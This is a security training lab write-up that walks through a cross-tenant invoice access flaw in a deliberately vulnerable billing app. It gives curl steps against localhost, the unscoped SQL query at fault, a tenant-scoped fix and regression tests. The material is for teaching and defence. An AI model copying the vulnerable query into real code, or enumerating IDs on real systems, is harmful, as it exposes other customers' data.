# Lab 1 — Cross-Tenant Invoice Access

## 1. Objective

Demonstrate how missing tenant-scoped authorization on a resource-retrieval endpoint allows authenticated users in one tenant to read invoices belonging to a different tenant.

## 2. Scenario

A multi-tenant billing application stores invoices partitioned by `tenant_id`. Each user belongs to exactly one tenant. The invoice listing endpoint correctly scopes results to the caller's tenant, but the single-invoice detail endpoint accepts an arbitrary invoice ID without verifying tenant ownership.

**Trust boundary:** The application assumes that because the listing only returns tenant-scoped invoices, users will never request invoice IDs outside their tenant.

## 3. Preconditions

| Item | Value |
|------|-------|
| Attacker account | `alice` / `alice123` (tenant 1) |
| Target data | Invoice ID 4 (`INV-2001`, tenant 2, $12,400, "Delta Partners") |
| Seed state | Default — run `POST /reset` if needed |

Alice can see invoices 1–3 (tenant 1) through the normal listing. Invoice IDs 4 and 5 belong to tenant 2.

## 4. Vulnerability Mechanism

The listing endpoint filters by `tenant_id`:

```sql
SELECT * FROM invoices WHERE tenant_id = ?
```

The detail endpoint omits that filter:

```sql
SELECT * FROM invoices WHERE id = ?
```

Any authenticated user who guesses or enumerates an invoice ID outside their tenant receives the full invoice record.

## 5. Reproduction

1. Log in as `alice` (tenant 1):

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123"
```

2. List invoices for tenant 1 (returns IDs 1–3):

```bash
curl -b cookies.txt http://localhost:5000/lab/bac/bac-01/invoices
```

3. Request an invoice belonging to tenant 2:

```bash
curl -b cookies.txt http://localhost:5000/lab/bac/bac-01/invoices/4
```

4. Observe that the response returns the full invoice record for `INV-2001` including customer name and amount.

## 6. Evidence

The response to step 3 contains:

```json
{
  "id": 4,
  "tenant_id": 2,
  "invoice_number": "INV-2001",
  "customer_name": "Delta Partners",
  "amount": 12400.0,
  "status": "paid"
}
```

The `tenant_id` in the response (2) differs from Alice's tenant (1), confirming unauthorized cross-tenant access.

## 7. Root Cause

**File:** `app/routes/bac.py`
**Function:** `lab01_get_invoice()`

In vulnerable mode the query is:

```python
invoice = db.execute("SELECT * FROM invoices WHERE id = ?", (invoice_id,)).fetchone()
```

The tenant boundary is enforced on the listing endpoint but absent from the detail endpoint — a classic authorization gap between index and show actions.

## 8. Impact

An attacker with any authenticated account can enumerate all invoice IDs across every tenant in the system. This exposes customer names, billing amounts, payment status, and PDF export paths — a significant data breach in a real multi-tenant SaaS application.

## 9. Remediation

Add the caller's `tenant_id` to the detail query:

```python
invoice = db.execute(
    "SELECT * FROM invoices WHERE id = ? AND tenant_id = ?",
    (invoice_id, session['tenant_id'])
).fetchone()
```

This ensures the same tenant scope is enforced on every invoice access path.

## 10. Regression Validation

**Test:** `tests/test_lab_01.py`

- **Vulnerable mode:** Alice requests invoice 4 → HTTP 200 with tenant 2 data.
- **Patched mode:** Alice requests invoice 4 → HTTP 404 ("Invoice not found").
- **Positive control:** Alice requests invoice 1 (her own tenant) → HTTP 200 in both modes.

## 11. Research Discussion

1. Why is it insufficient to rely on the listing endpoint's tenant filter as a security control for individual resource access?
2. What systematic testing approach could an organization use to detect missing authorization checks across all resource endpoints in an API?
3. How does this vulnerability differ from a simple IDOR, and what additional trust boundary does multi-tenancy introduce?
